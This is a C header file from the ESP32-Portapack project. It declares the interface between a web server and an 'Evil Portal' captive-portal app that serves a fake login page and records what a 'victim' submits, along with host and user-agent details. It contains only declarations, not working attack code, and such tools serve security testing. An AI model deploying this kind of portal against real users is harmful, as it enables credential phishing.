/*
 * Copyright (C) 2025 HTotoo
 *
 * This file is part of ESP32-Portapack.
 *
 * For additional license information, see the LICENSE file.
 */

#ifndef EVILPORTAL_BRIDGE_H
#define EVILPORTAL_BRIDGE_H

// Small decoupling layer between the HTTP server (lives in webserver.h, the
// main translation unit) and the Evil Portal app (its own .cpp). Only plain
// free functions cross the boundary, so neither side needs the other's types.

#include <stddef.h>
#include <stdbool.h>

#ifdef __cplusplus
extern "C" {
#endif

// --- implemented in webserver.h (HTTP layer) ---
// Register / unregister the captive 404 catch-all handler and flip the active
// flag. Safe to call from a task context (web / main loop), NOT from an IRQ.
void evilportal_http_set_active(bool active);
// True while the captive portal is serving. Read by the root ("/") handler so
// it can decide between the management UI and the portal page.
bool evilportal_http_is_active(void);

// --- implemented in ep_app_evilportal.cpp (the app) ---
// Returns the currently selected portal page. Caller must not free it.
const char* evilportal_get_portal_html(size_t* out_len);
// Called by the HTTP layer when a victim submits the login form. Body is the
// raw (url-encoded) POST body; host/ua may be NULL if not present.
void evilportal_on_capture(const char* body, size_t body_len, const char* host, const char* ua);

#ifdef __cplusplus
}
#endif

#endif  // EVILPORTAL_BRIDGE_H
